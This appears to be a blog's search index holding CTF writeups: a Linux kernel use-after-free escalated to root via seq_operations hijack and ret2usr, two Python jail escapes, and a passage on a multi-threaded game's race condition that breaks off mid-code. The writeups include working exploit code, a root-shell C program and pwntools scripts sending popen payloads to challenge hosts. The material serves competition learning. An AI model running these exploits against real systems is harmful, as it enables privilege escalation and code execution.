<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TsukuCTF 2025 writeups: easy_kernel</title>
    <link href="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/"/>
    <url>/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/</url>
    
    <content type="html"><![CDATA[<h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><p><img src="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/1.png" alt="image"></p><p>flag在<code>/dev/sdb</code>，只有root可以讀取到</p><p>本題附檔有給源代碼</p><p>本題沒有開啟kpti，沒有開啟kaslr(內核的東西位址都固定)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">~ # cat /proc/cmdline<br><span class="hljs-attribute">root</span>=/dev/sda rw <span class="hljs-attribute">init</span>=/init <span class="hljs-attribute">console</span>=ttyS0 nokaslr nopti <span class="hljs-attribute">loglevel</span>=0 <span class="hljs-attribute">oops</span>=panic <span class="hljs-attribute">panic</span>=-1<br></code></pre></td></tr></table></figure><p>本題的CPU也沒有支援SMEP跟SMAP，所以內核態可以訪問&#x2F;執行用戶空間的數據</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">~ <span class="hljs-meta"># grep -E <span class="hljs-string">&#x27;smep|smap&#x27;</span> /proc/cpuinfo</span><br>~ <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>本題Linux 6.14.2，<code>prepare_kernel_cred(NULL)</code>已經無法直接或取<code>init_cred</code>，但沒開kaslr，所以可以直接找到<code>init_cred</code>的位址然後<code>commit_creds(&amp;init_cred)</code></p><h2 id="掛載題目磁碟映像"><a href="#掛載題目磁碟映像" class="headerlink" title="掛載題目磁碟映像"></a>掛載題目磁碟映像</h2><p>本題的磁碟映像在<code>rootfs.ext3</code>，用以下指令就可以掛載到系統上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> /mnt/ext3<br><span class="hljs-built_in">sudo</span> mount ./rootfs.ext3 /mnt/ext3<br></code></pre></td></tr></table></figure><p>直接<code>cd /mnt/ext3</code>在裡面編寫及編譯exploit就可以了</p><h1 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h1><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>題目會載入自製的kernel module<code>vuln.ko</code>，後面會針對它做分析<br><img src="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/2.png" alt="image"></p><h2 id="vuln-ko-init-module"><a href="#vuln-ko-init-module" class="headerlink" title="vuln.ko &#x2F; init_module"></a>vuln.ko &#x2F; init_module</h2><p>會註冊一個設備<code>/dev/vuln</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">module_initialize</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (misc_register(&amp;vuln_dev) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vuln-ko-cleanup-module"><a href="#vuln-ko-cleanup-module" class="headerlink" title="vuln.ko &#x2F; cleanup_module"></a>vuln.ko &#x2F; cleanup_module</h2><p>拿掉設備<code>/dev/vuln</code>，並摧毀互斥鎖<code>module_lock</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">module_cleanup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    misc_deregister(&amp;vuln_dev);<br>    mutex_destroy(&amp;module_lock);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vuln-ko-module-ioctl"><a href="#vuln-ko-module-ioctl" class="headerlink" title="vuln.ko &#x2F; module_ioctl"></a>vuln.ko &#x2F; module_ioctl</h2><p>在開始操作之前，會先把互斥鎖<code>module_lock</code>上鎖，操作結束之後才會把<code>module_lock</code>解鎖，所以race condition是沒有了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">module_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span> &#123;<br>    <span class="hljs-type">request_t</span> req;<br>    <span class="hljs-type">long</span> ret;<br>    <span class="hljs-keyword">if</span> (copy_from_user(&amp;req, (<span class="hljs-type">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(req)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    mutex_lock(&amp;module_lock);<br>    <span class="hljs-keyword">switch</span>(cmd) &#123;<br>        <span class="hljs-keyword">case</span> CMD_ALLOC:<br>            ret = obj_alloc();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_WRITE:<br>            ret = obj_write(req.data, req.size);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_FREE:<br>            ret = obj_free();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            ret = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    mutex_unlock(&amp;module_lock);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>這裡有三種操作可以做</p><ul><li>CMD_ALLOC(0xf000) - 如果指針<code>obj</code>是空指針，就會kzalloc一塊<code>struct obj</code>大小(0x20)的記憶體，把位址存到全域變數指針<code>obj</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">obj_alloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    obj = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> obj), GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>CMD_WRITE(0xf001) - 如果指針<code>obj</code>不為空指針，而且<code>size</code>(寫入資料大小)不超過<code>struct obj</code>的大小(0x20)，就可以把資料<code>data</code>寫入<code>obj</code>指向的記憶體</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">obj_write</span><span class="hljs-params">(<span class="hljs-type">char</span> *data, <span class="hljs-type">size_t</span> size)</span> &#123;<br>    <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">NULL</span> || size &gt; OBJ_SIZE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (copy_from_user(obj-&gt;buf, data, size) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>CMD_FREE(0xf002) - 把<code>obj</code>指向的記憶體free掉，但沒有清空指針，造成UAF，可以搭配CMD_WRITE攻擊。但因為CMD_ALLOC會檢查<code>obj</code>是不是空指針，所以一旦CMD_FREE之後就不能再進行CMD_ALLOC(操作會失敗)，在這個<code>vuln.ko</code>中只能<code>kzalloc</code>一次</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">obj_free</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    kfree(obj);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>因為只能<code>kzalloc</code>一次，所以劫持freelist的就別想了。</p><p>在Linux中，open一個<code>/proc/self/stat</code>時，內核會從heap分配一個0x20大小的記憶體，當成<code>struct seq_operations</code>用<br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L31">https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L31</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>而read<code>proc/self/stat</code>時，內核會調用到<code>seq_read_iter()</code><br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L171">https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L171</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ready-made -&gt;f_op-&gt;read_iter()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br></code></pre></td></tr></table></figure><p>先看到這邊，<code>struct seq_file</code>的member<code>op</code>就是一個指向<code>struct seq_operations</code>的指針<br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L16">https://elixir.bootlin.com/linux/v6.14.5/source/include/linux/seq_file.h#L16</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>回到<code>seq_read_iter()</code>，<code>m</code>就是一個指向<code>struct seq_file</code>的指針。<br>在Ln225中，會呼叫<code>m-&gt;op-&gt;start</code>的function<br><a href="https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L225">https://elixir.bootlin.com/linux/v6.14.5/source/fs/seq_file.c#L225</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>...<br><span class="hljs-comment">// get a non-empty record in the buffer</span><br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>...<br></code></pre></td></tr></table></figure><p>因為這題沒開KPTI、SMAP、SMEP，可以訪問&#x2F;執行用戶態數據，所以可以寫userspace shellcode打ret2usr(難怪會叫easy_kernel，這年頭沒人保護全關了)</p><p>總結以上，若我們</p><ol><li>CMD_ALLOC一個0x20大小的記憶體之後，CMD_FREE掉它</li><li><code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>，內核alloc一塊0x20的記憶體當成<code>struct seq_operations</code>時剛好申請到上一步時候free掉的記憶體，就會有一個<code>struct seq_operations</code>落入我們的控制</li><li>透過UAF，CMD_WRITE對這個已經被當成<code>struct seq_operations</code>的記憶體做寫入，把<code>start</code>改成userspace上的shellcode的位址</li><li>read<code>/proc/self/stat</code>時，呼叫<code>m-&gt;op-&gt;start</code>，成功跳到shellcode上，就可以做提權</li></ol><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// musl-gcc -static -Os -s exp.c -o exp2</span><br><span class="hljs-comment">// python3 upload.py /mnt/ext3/exp2 challs.tsukuctf.org 19000</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> *data;<br>&#125; <span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff812a1050</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff81e3bfa0</span>;<br><br><span class="hljs-type">int</span> (*commit_creds_kfunc)(<span class="hljs-type">void</span> *cred);<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ret2usr_attack</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    commit_creds_kfunc = (<span class="hljs-type">int</span> (*)(<span class="hljs-type">void</span>*)) commit_creds;<br><br>    (*commit_creds_kfunc)(init_cred);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// main</span><br>        <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">request_t</span> req;<br>        <span class="hljs-comment">// alloc chunk#1 and free it</span><br>        ioctl(fd1, <span class="hljs-number">0xf000</span>, &amp;req);<br>        ioctl(fd1, <span class="hljs-number">0xf002</span>, &amp;req);<br><br>        <span class="hljs-comment">// chunk#1 now is a (struct)seq_operations</span><br>        <span class="hljs-type">int</span> fd_proc = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br><br>        <span class="hljs-comment">// uaf</span><br>        req.size = <span class="hljs-number">32</span>;<br>        <span class="hljs-type">size_t</span> *buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) buf[i] = (<span class="hljs-type">size_t</span>) ret2usr_attack;<br>        req.data = buf;<br>        ioctl(fd1, <span class="hljs-number">0xf001</span>, &amp;req);<br><br>        <span class="hljs-comment">// exploit</span><br>        <span class="hljs-type">char</span> bp[<span class="hljs-number">8</span>];<br>        read(fd_proc, bp, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (getuid() == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Success&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Failed&quot;</span>);<br>        &#125;<br><br>        close(fd1);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/05/TsukuCTF-2025-writeups-easy-kernel/3.png" alt="image"></p><blockquote><p>Flag: TsukuCTF25{n0w_u_learned_h0w_to_turn_UAF_int0_r00t}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>writeups</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THJCC 2025 Summer / Pyjail01, Pyjail02, MyGame writeups</title>
    <link href="/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/"/>
    <url>/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/</url>
    
    <content type="html"><![CDATA[<p>Challenge source files are available on <a href="https://github.com/pictures2333/THJCC-CTF-2025-Summer">Github</a></p><h1 id="Pyjail01"><a href="#Pyjail01" class="headerlink" title="Pyjail01"></a>Pyjail01</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata, string<br><br>_ = string.ascii_letters<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    inpt = unicodedata.normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>))<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> inpt:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> _:<br>            <span class="hljs-keyword">raise</span> NameError(<span class="hljs-string">&quot;No ASCII letters!&quot;</span>)<br>    <br>    <span class="hljs-built_in">exec</span>(inpt)<br><br></code></pre></td></tr></table></figure><p>Variable <code>_</code> is a string with all ascii letters and it is a blacklist.</p><p>The program uses <code>unicodedata.normalize(&quot;NFKC&quot;, input(&quot;&gt; &quot;))</code>, so user can not bypass blacklist by entering Unicode characters.</p><p>The program executes user’s input with <code>exec()</code>, which allows assign values to variables. And the program allows multiple inputs. So you can clear the blacklist with <code>_=&quot;&quot;</code>, then read the flag with <code>print(__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read())</code>.</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;chal.ctf.scint.org&quot;</span>, <span class="hljs-number">19000</span>)<br><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;_=\&#x27;\&#x27;&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, <span class="hljs-string">b&quot;print(__import__(\&quot;os\&quot;).popen(\&quot;cat /flag.txt\&quot;).read())&quot;</span>)<br><br><span class="hljs-built_in">print</span>(r.recvline().decode()[<span class="hljs-number">1</span>:])<br><br>r.close()<br></code></pre></td></tr></table></figure><h1 id="Pyjail02"><a href="#Pyjail02" class="headerlink" title="Pyjail02"></a>Pyjail02</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br>inpt = unicodedata.normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">eval</span>(inpt, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>:&#123;&#125;&#125;, &#123;&#125;))<br></code></pre></td></tr></table></figure><p>The program evaluates user’s input with <code>eval()</code>, but restricts access to bulit-in functions and global&#x2F;local variables.</p><p>But you can access <code>object</code> via MRO chain, then get <code>os._wrap_close</code> from subclasses of <code>object</code>. Finally, you can call <code>popen()</code> and get shell.</p><h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;chal.ctf.scint.org&quot;</span>, <span class="hljs-number">19001</span>)<br><br>_os_warp_idx = <span class="hljs-number">141</span><br>payload = <span class="hljs-string">f&quot;().__class__.__mro__[1].__subclasses__()[<span class="hljs-subst">&#123;_os_warp_idx&#125;</span>].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag.txt&#x27;).read()&quot;</span><br><br>r.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>, payload.encode())<br><br><span class="hljs-built_in">print</span>(r.recvline().decode()[<span class="hljs-number">1</span>:])<br><br>r.close()<br></code></pre></td></tr></table></figure><h1 id="MyGame"><a href="#MyGame" class="headerlink" title="MyGame"></a>MyGame</h1><p>It is a multi-thread program. You can control two players(player01 and player02) to play the game.</p><h2 id="VIP-Player"><a href="#VIP-Player" class="headerlink" title="VIP Player"></a>VIP Player</h2><p>It gives win function address as gift to all players. But only VIP players can get libc address and put chest on the map.</p><p>You can get VIP by playing lottery (go gambling). In <code>func.h / lottery()</code>, the game generates a random number and convert it to a string <code>rnbuf</code>. Then you can enter your number. It uses <code>!memcmp(rnbuf, gubuf, strlen(gubuf))</code> to compare if <code>rnbuf</code> and player’s input <code>gubuf</code> are the same. If true, then the player can upgrade to VIP.</p><p>But it calls <code>memcmp</code> with the length of user’s input <code>gubuf</code> as <code>n</code>.This means if user inputs <code>\x00</code>, <code>strlen(gubuf)</code> will be 0, and <code>memcmp</code> will not work. The player can bypass the check and upgrade to vip easily.</p><p>We upgrade player01 to VIP in the step.</p><h2 id="Dangling-Pointer"><a href="#Dangling-Pointer" class="headerlink" title="Dangling Pointer"></a>Dangling Pointer</h2><p>With chest, you can put it on map, and put blocks into it.</p><p>Chest structure has a member <code>itemlist</code>, which is a FILO linked list. When a item is put into a chest, the game will create a new <code>inchest</code> structure, save the pointer of the item in <code>inchest.item</code> and push the <code>inchest</code> structure into <code>itemlist</code> of the chest.</p><p><img src="/2025/04/20/THJCC-2025-Pyjail01-Pyjail02-MyGame-writeups/explain_chest.png" alt="chest"></p><p><code>func.h / destory_block()</code>. It will be called when a player chooses <code>[3] Destory block</code> in game menu. When a player destorys a chest, the game will (1) free the chest first, then (2) free all nodes in <code>itemlist</code>. Finally, it will (3) clear the pointer of the chest on map.</p><p>However, while it is performing step 2, there is a dangling poiner of the chest which is freed in step 1. If the chest has a huge number of blocks, it will take a long time (1s or longer) to free all of them. And you can control the other player (player02) to <code>get_block()</code> to get the “freed-chest” before it is cleared in step 3.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 